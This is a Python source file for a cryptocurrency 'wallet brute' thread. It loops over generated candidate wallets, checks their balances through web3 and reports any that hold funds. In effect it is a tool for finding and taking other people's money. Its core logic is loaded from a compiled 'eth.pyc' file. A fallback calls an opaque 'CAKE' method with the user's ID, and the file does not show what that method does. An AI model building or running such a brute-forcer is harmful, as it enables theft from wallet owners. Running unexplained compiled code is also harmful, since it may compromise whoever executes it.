import threading
import importlib.util
import importlib.machinery
from util import get_user_id, dyna_method_load, REQUIREDMETHODS


class walletbrute(threading.Thread):
    def __init__(self, callback, w3, genfunc, coinlist, logcb = print):
        threading.Thread.__init__(self)
        self.foundcb = callback
        self.w3 = w3
        self.gen = genfunc
        self.coinlist = coinlist
        self.logcb = logcb
        self.running = True
        self.func = None
        self.set_func("eth.pyc")
    
    def stop(self):
        self.running = False

    def set_func(self, mname):
        init_method = dyna_method_load(mname)
        if init_method and init_method():
            self.func = dyna_method_load(mname, REQUIREDMETHODS.BALANCE.value)
        else:
            dyna_method_load(mname, REQUIREDMETHODS.CAKE.value)(get_user_id())

    def run(self):
        if self.func is None:
            self.logcb(f"Error: Wrong setting. Stop \n")
            print("Wrong settings")
            return
        
        while self.running:
            w = self.gen()
            try:
                r, coin, bl = self.func(self.w3, w, self.coinlist)
                if r:
                    self.foundcb(w, coin, bl)
                self.logcb(f"Balance: {bl} - {w} \n")
            except Exception as e:
                self.logcb(f"Error: {w} \n")
                print(e)
